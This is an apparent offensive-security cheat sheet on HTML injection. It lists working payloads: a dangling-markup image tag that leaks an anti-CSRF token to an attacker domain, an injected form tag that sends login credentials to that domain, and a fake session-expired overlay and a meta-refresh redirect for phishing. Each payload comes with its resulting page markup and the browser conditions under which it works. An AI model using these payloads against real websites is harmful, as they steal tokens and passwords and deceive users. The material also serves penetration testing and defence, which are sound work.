# HTML Injection

## Table of Contents

- [Data Exfiltration](#data-exfiltration)
- [Credential Stealing](#credential-stealing)
- [Phishing](#phishing)

## Data Exfiltration

### Content that follows the injection point, such as an anti-CSRF token, can be sent to the attacker without running any script. [^1]

- Leaking a token through an unterminated attribute (dangling markup)
    1. Request
        ```text
        https://[VULNERABLE-SERVICE]/account?name="><img src='https://[ATTACKER-DOMAIN]/?
        ```

    2. Resulting page
        ```html
        <input name="name" value=""><img src='https://[ATTACKER-DOMAIN]/?"><input type="hidden" name="csrf_token" value="[CSRF-TOKEN]"><button class='primary'>Save</button>
        ```
    Everything up to the next single quote, including the token, becomes part of the image URL and is sent to the attacker. With the token, the actions it protects can be forged as described in [CSRF](./CSRF.md).

## Credential Stealing

### Credentials that the victim submits through a legitimate form can be sent to the attacker instead. [^2]

- Hijacking a login form
    1. Injected markup, placed before the login form
        ```html
        <form action="https://[ATTACKER-DOMAIN]/">
        ```

    2. Resulting page
        ```html
        <form action="https://[ATTACKER-DOMAIN]/">
        ...
        <form action="/login" method="POST">
            <input name="username">
            <input type="password" name="password">
            <button>Sign in</button>
        </form>
        ```
    The browser ignores a `<form>` start tag while another form is open, so the username and password fields belong to the injected form. Values filled in by a password manager are sent the same way when the victim signs in.

## Phishing

### Misleading content can be shown on a trusted page, even where a Content Security Policy blocks scripts.

- Injecting a fake sign-in prompt
    ```html
    <div style="position:fixed; inset:0; background:#fff; z-index:9999">
        <h2>Your session has expired</h2>
        <form action="https://[ATTACKER-DOMAIN]/login" method="POST">
            <input name="username" placeholder="Username">
            <input type="password" name="password" placeholder="Password">
            <button>Sign in</button>
        </form>
    </div>
    ```

- Redirecting to an attacker-controlled page
    ```html
    <meta http-equiv="refresh" content="0; url=https://[ATTACKER-DOMAIN]/login">
    ```

[^1]: Chromium blocks requests whose URL contains both a raw line break and `<`, so this applies when the leaked content contains no line break, as in minified HTML, or in browsers without this restriction.
[^2]: Applies when the injection point is before the legitimate `<form>` start tag and no other form is open at that point. A `form-action` directive in the Content Security Policy blocks the submission.
